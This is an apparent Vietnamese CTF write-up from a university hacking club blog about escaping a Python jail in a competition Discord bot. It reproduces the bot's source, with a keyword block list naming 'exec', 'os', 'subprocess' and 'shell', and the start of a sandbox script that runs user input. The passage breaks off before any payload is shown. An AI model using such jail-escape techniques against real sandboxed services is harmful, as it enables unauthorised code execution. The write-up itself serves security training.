<!DOCTYPE html><html lang="vi" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="FPTU SecAthon 2020 MISC Writeup PRP301" /><meta name="author" content="Antoine Hoang" /><meta property="og:locale" content="vi" /><meta name="description" content="PRP301 Thử thách: Discord Bot is broken :&lt; Direct Message FUCTF Bot #3982 for more detail (￣︶￣*)) Note: Using command !help Gợi ý: Pyjail !flag return 1 class, mro, subclass + string concatenation" /><meta property="og:description" content="PRP301 Thử thách: Discord Bot is broken :&lt; Direct Message FUCTF Bot #3982 for more detail (￣︶￣*)) Note: Using command !help Gợi ý: Pyjail !flag return 1 class, mro, subclass + string concatenation" /><link rel="canonical" href="https://fptu-ethical-hackers-club.github.io/posts/FuSec3-PRP301/" /><meta property="og:url" content="https://fptu-ethical-hackers-club.github.io/posts/FuSec3-PRP301/" /><meta property="og:site_name" content="Ethical Hackers Club" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-03T00:13:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="FPTU SecAthon 2020 MISC Writeup PRP301" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Antoine Hoang" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2020-11-03T00:13:00+07:00","datePublished":"2020-11-03T00:13:00+07:00","description":"PRP301 Thử thách: Discord Bot is broken :&lt; Direct Message FUCTF Bot #3982 for more detail (￣︶￣*)) Note: Using command !help Gợi ý: Pyjail !flag return 1 class, mro, subclass + string concatenation","mainEntityOfPage":{"@type":"WebPage","@id":"https://fptu-ethical-hackers-club.github.io/posts/FuSec3-PRP301/"},"url":"https://fptu-ethical-hackers-club.github.io/posts/FuSec3-PRP301/","@type":"BlogPosting","author":{"@type":"Person","name":"Antoine Hoang"},"headline":"FPTU SecAthon 2020 MISC Writeup PRP301","@context":"https://schema.org"}</script><title>FPTU SecAthon 2020 | MISC Writeup | PRP301 | Ethical Hackers Club</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ethical Hackers Club"><meta name="application-name" content="Ethical Hackers Club"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.updateMermaid(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ethical Hackers Club</a></div><div class="site-subtitle font-italic">FPT University</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a id="mode-toggle-wrapper" tabindex="0" onclick="flipMode()"> <i class="mode-toggle fas fa-adjust"></i> </a> <span class="icon-border"></span> <a href="https://github.com/FPTU-Ethical-Hackers-Club" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://facebook.com/ehc.fptu" aria-label="facebook" target="_blank" rel="noopener"> <i class="fab fa-facebook"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ehc.fpt','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>FPTU SecAthon 2020 | MISC Writeup | PRP301</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>FPTU SecAthon 2020 | MISC Writeup | PRP301</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/antoinenguyen-09">Antoine Hoang</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2020-11-03 00:13:00 +0700" data-toggle="tooltip" data-placement="bottom" title="Tue, Nov 3, 2020, 12:13 AM +0700" >Nov 3, 2020</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3788 words"> <em>21 min</em> read</span></div></div></div><div class="post-content"><h1 id="prp301">PRP301</h1><h2 id="thử-thách">Thử thách:<a href="#thử-thách"><i class="fas fa-hashtag"></i></a></h2></h2><p>Discord Bot is broken :&lt;<br /> Direct Message <strong>FUCTF Bot #3982</strong> for more detail (￣︶￣*))<br /> Note: Using command <strong>!help</strong></p><h2 id="gợi-ý">Gợi ý:<a href="#gợi-ý"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Pyjail<li>!flag return 1<li>class, mro, subclass + string concatenation</ul><h2 id="kiến-thức-nền">Kiến thức nền:<a href="#kiến-thức-nền"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Using Discord Bot.<li>PyJail Escape.<li>OOP in Python.<li>Pipeline.<li>Server-sided template injection with Jinja2.</ul><h2 id="giải-quyết-vấn-đề">Giải quyết vấn đề:<a href="#giải-quyết-vấn-đề"><i class="fas fa-hashtag"></i></a></h2></h2><p>1/ Initial reconnaissance (Pipeline, Using Discord Bot):</p><p>Nhanh tay làm những việc sau:</p><ul><li>Join server discord của <a href="https://discord.com/invite/UHfhh6X">FU SecAthon</a>, sau đó vào inbox trực tiếp với con bot của server (FUCTF BOT) trong DM để tra khảo nó:v <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/96334816-b3f4b200-109d-11eb-8fa2-2136ad231446.png" alt="image" /><li>Gõ !help để xem BOT hỗ trợ những command gì:. <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/96334897-53b24000-109e-11eb-9bd2-84047765082d.png" alt="image" /><li>Chỉ có duy nhất 1 command ở đây mà chúng ta cần chú ý: <img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/96334951-c4595c80-109e-11eb-991c-b4993bf479ed.png" alt="image" /></ul><p>Đây là link dẫn đến source code của con bot này. Cùng check xem có gì hay ho trong đó nào&lt;3</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
</pre><td class="rouge-code"><pre><span class="c1"># bot.py
</span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">discord.ext</span> <span class="kn">import</span> <span class="n">commands</span>
<span class="kn">import</span> <span class="nn">asyncio</span>
<span class="kn">import</span> <span class="nn">discord</span>
<span class="kn">from</span> <span class="nn">dotenv</span> <span class="kn">import</span> <span class="n">load_dotenv</span>

<span class="n">load_dotenv</span><span class="p">()</span>
<span class="n">TOKEN</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">'DISCORD_TOKEN'</span><span class="p">)</span>

<span class="n">banned</span> <span class="o">=</span> <span class="p">[</span>	
	<span class="s">"import"</span><span class="p">,</span>
    <span class="s">"exec"</span><span class="p">,</span>
    <span class="s">"eval"</span><span class="p">,</span>
    <span class="s">"pickle"</span><span class="p">,</span>
    <span class="s">"os"</span><span class="p">,</span>
    <span class="s">"subprocess"</span><span class="p">,</span>
    <span class="s">"input"</span><span class="p">,</span>
    <span class="s">"banned"</span><span class="p">,</span>
    <span class="s">"compile"</span><span class="p">,</span>
    <span class="s">"system"</span><span class="p">,</span>
    <span class="s">"warnings"</span><span class="p">,</span>
    <span class="s">"open"</span><span class="p">,</span>
    <span class="s">"assert"</span><span class="p">,</span>
    <span class="s">"per"</span><span class="p">,</span>
    <span class="s">"pper"</span><span class="p">,</span>
    <span class="s">"chr"</span><span class="p">,</span>
    <span class="s">"exit"</span><span class="p">,</span>
    <span class="s">"__import__"</span><span class="p">,</span>
<span class="p">]</span>
 
 
<span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s">"[]"</span><span class="p">,</span> <span class="s">"''"</span><span class="p">,</span> <span class="s">'""'</span><span class="p">,</span> <span class="s">"{}"</span><span class="p">,</span> <span class="s">"write"</span><span class="p">,</span> <span class="s">"read"</span><span class="p">,</span> <span class="s">"communicate"</span><span class="p">,</span> <span class="s">"base"</span><span class="p">,</span> <span class="s">"getitem"</span><span class="p">,</span> <span class="s">"shell"</span><span class="p">,</span> <span class="s">"encode"</span><span class="p">,</span> <span class="s">"decode"</span><span class="p">,</span> <span class="s">"upper"</span><span class="p">,</span> <span class="s">"lower"</span><span class="p">]</span>
 
<span class="n">banned</span> <span class="o">=</span> <span class="n">banned</span> <span class="o">+</span> <span class="n">blacklist</span>

<span class="n">help_str</span> <span class="o">=</span> <span class="s">'''
`Welcome to FU SecAthon Season 3
1. ping 
2. help 
3. author
4. leak
5. source
6. version`
'''</span>

<span class="n">author_str</span> <span class="o">=</span> <span class="s">'''
`Web Exploitation: KhoaBDA
Cryptography: PhiNC
Forensic + Miscellaneous: TungDLM
Binary Exploitation: NghiaDT
Reverse Engineering: VinhTHP`
'''</span>

<span class="n">leak_str</span> <span class="o">=</span> <span class="s">'''
`Web Exploitation: https://quizlet.com/342338675/iaw-full-by-phat-flash-cards/
Cryptography: https://quizlet.com/vn/457045651/cry302-flash-cards
Reverse Engineering: https://quizlet.com/387215551/iam-hoi-bi-chuan-flash-cards
Miscellaneous: https://quizlet.com/vn/454992157/frs301_edited-flash-cards/
Binary Exploitation: https://quizlet.com/vn/500408500/hod401-vinh-flash-cards/
Forensic: https://quizlet.com/vn/454992157/frs301_edited-flash-cards/`
'''</span>

<span class="n">source_str</span> <span class="o">=</span> <span class="s">'''`https://drive.google.com/drive/folders/1Ho55hI7XOOycyxCPrHdKyl20MuXSfyGU?usp=sharing`'''</span>

<span class="n">client</span> <span class="o">=</span> <span class="n">discord</span><span class="p">.</span><span class="n">Client</span><span class="p">()</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">commands</span><span class="p">.</span><span class="n">Bot</span><span class="p">(</span><span class="n">command_prefix</span><span class="o">=</span><span class="n">commands</span><span class="p">.</span><span class="n">when_mentioned_or</span><span class="p">(</span><span class="s">"!"</span><span class="p">))</span>
<span class="n">client</span><span class="p">.</span><span class="n">remove_command</span><span class="p">(</span><span class="s">'help'</span><span class="p">)</span>

<span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">event</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">on_ready</span><span class="p">():</span>
	<span class="k">await</span> <span class="n">client</span><span class="p">.</span><span class="n">change_presence</span><span class="p">(</span><span class="n">activity</span><span class="o">=</span><span class="n">discord</span><span class="p">.</span><span class="n">Game</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">"###Welcome_Flag###"</span><span class="p">))</span>

<span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">command</span><span class="p">()</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">ping</span><span class="p">(</span><span class="n">ctx</span><span class="p">):</span>
    <span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">'`Pong! </span><span class="si">{</span><span class="nb">round</span> <span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">latency</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span><span class="si">}</span><span class="s">ms `'</span><span class="p">)</span>

<span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">command</span><span class="p">()</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">help</span><span class="p">(</span><span class="n">ctx</span><span class="p">):</span>
	<span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">help_str</span><span class="p">)</span>

<span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">command</span><span class="p">()</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">author</span><span class="p">(</span><span class="n">ctx</span><span class="p">):</span>
	<span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">author_str</span><span class="p">)</span>

<span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">command</span><span class="p">()</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">ctx</span><span class="p">):</span>
	<span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">leak_str</span><span class="p">)</span>

<span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">command</span><span class="p">()</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">source</span><span class="p">(</span><span class="n">ctx</span><span class="p">):</span>
	<span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">source_str</span><span class="p">)</span>

<span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">command</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">"flag"</span><span class="p">)</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">flag</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
	<span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"```"</span><span class="p">)</span> <span class="ow">and</span> <span class="n">data</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"```"</span><span class="p">):</span>
		<span class="n">data</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">"` </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

	<span class="k">for</span> <span class="n">ban</span> <span class="ow">in</span> <span class="n">banned</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">ban</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">data</span><span class="p">.</span><span class="n">lower</span><span class="p">():</span>
			<span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">'Invalid Payload xD'</span><span class="p">)</span>
			<span class="k">return</span>

	<span class="n">action</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">create_subprocess_exec</span><span class="p">(</span><span class="s">"py"</span><span class="p">,</span> <span class="s">"exploit.py"</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">asyncio</span><span class="p">.</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">asyncio</span><span class="p">.</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">asyncio</span><span class="p">.</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>

	<span class="k">try</span><span class="p">:</span>
		<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="n">wait_for</span><span class="p">(</span><span class="n">action</span><span class="p">.</span><span class="n">communicate</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">()),</span> <span class="mi">5</span><span class="p">)</span>
	<span class="k">except</span> <span class="n">asyncio</span><span class="p">.</span><span class="nb">TimeoutError</span><span class="p">:</span>
		<span class="k">await</span> <span class="n">action</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">out</span> <span class="ow">or</span> <span class="n">err</span><span class="p">:</span>
			<span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">"```py</span><span class="se">\n</span><span class="si">{</span><span class="n">out</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}{</span><span class="n">err</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\n</span><span class="s">```"</span><span class="p">)</span>

<span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">command</span><span class="p">()</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">version</span><span class="p">(</span><span class="n">ctx</span><span class="p">):</span>
	<span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">version</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">client</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">TOKEN</span><span class="p">)</span>
</pre></table></code></div></div><p>Có một số chỗ chúng ta cần chú ý trong source code này. Trước hết là array banned và blacklist:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre> <span class="n">banned</span> <span class="o">=</span> <span class="p">[</span>	
	<span class="s">"import"</span><span class="p">,</span>
    <span class="s">"exec"</span><span class="p">,</span>
    <span class="s">"eval"</span><span class="p">,</span>
    <span class="s">"pickle"</span><span class="p">,</span>
    <span class="s">"os"</span><span class="p">,</span>
    <span class="s">"subprocess"</span><span class="p">,</span>
    <span class="s">"input"</span><span class="p">,</span>
    <span class="s">"banned"</span><span class="p">,</span>
    <span class="s">"compile"</span><span class="p">,</span>
    <span class="s">"system"</span><span class="p">,</span>
    <span class="s">"warnings"</span><span class="p">,</span>
    <span class="s">"open"</span><span class="p">,</span>
    <span class="s">"assert"</span><span class="p">,</span>
    <span class="s">"per"</span><span class="p">,</span>
    <span class="s">"pper"</span><span class="p">,</span>
    <span class="s">"chr"</span><span class="p">,</span>
    <span class="s">"exit"</span><span class="p">,</span>
    <span class="s">"__import__"</span><span class="p">,</span>
<span class="p">]</span>
  
<span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s">"[]"</span><span class="p">,</span> <span class="s">"''"</span><span class="p">,</span> <span class="s">'""'</span><span class="p">,</span> <span class="s">"{}"</span><span class="p">,</span> <span class="s">"write"</span><span class="p">,</span> <span class="s">"read"</span><span class="p">,</span> <span class="s">"communicate"</span><span class="p">,</span> <span class="s">"base"</span><span class="p">,</span> <span class="s">"getitem"</span><span class="p">,</span> <span class="s">"shell"</span><span class="p">,</span> <span class="s">"encode"</span><span class="p">,</span> <span class="s">"decode"</span><span class="p">,</span> <span class="s">"upper"</span><span class="p">,</span> <span class="s">"lower"</span><span class="p">]</span>
 
<span class="n">banned</span> <span class="o">=</span> <span class="n">banned</span> <span class="o">+</span> <span class="n">blacklist</span>
</pre></table></code></div></div><p>Có khả năng đây là danh sách các từ bị cấm sử dụng trong payload dùng để inject vào con bot. Kéo xuống gần cuối xem thì đúng là như vậy:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="n">ban</span> <span class="ow">in</span> <span class="n">banned</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">ban</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">data</span><span class="p">.</span><span class="n">lower</span><span class="p">():</span>
			<span class="k">await</span> <span class="n">ctx</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">'Invalid Payload xD'</span><span class="p">)</span>
			<span class="k">return</span>
</pre></table></code></div></div><p>Cũng ngay tại đoạn này tôi đã tìm ra cách để inject vào con bot. Đó là sử dụng lệnh “!flag + payload”:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">client</span><span class="p">.</span><span class="n">command</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">"flag"</span><span class="p">)</span>
<span class="k">async</span> <span class="k">def</span> <span class="nf">flag</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
	<span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"```"</span><span class="p">)</span> <span class="ow">and</span> <span class="n">data</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"```"</span><span class="p">):</span>
		<span class="n">data</span> <span class="o">=</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">"` </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
</pre></table></code></div></div><p>Tôi đã thử inject rất nhiều đoạn code python từ lớn đến bé bằng cách như sau nhưng bot chỉ trả về các dòng báo lỗi:</p><p><img data-proofer-ignore data-src="https://user-images.githubusercontent.com/61876488/96358557-9e7d9780-1132-11eb-8fa3-bd456cc01ba5.png" alt="image" /></p><p>Các lỗi trả về thường là “ ‘something’ is not defined”, và lỗi này có liên quan tới đoạn code <code class="language-plaintext highlighter-rouge">print(hack["func"]())</code> trong file exploit.py. Cùng check file này xem nào:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">textwrap</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">hack</span> <span class="o">=</span> <span class="p">{</span><span class="s">"__builtins__"</span><span class="p">:</span> <span class="p">{}}</span>
<span class="n">module</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"def func():</span><span class="se">\n</span><span class="si">{</span><span class="n">textwrap</span><span class="p">.</span><span class="n">indent</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(),</span> <span class="s">'    '</span><span class="p">)</span><span class="si">}</span><span class="s">"</span>
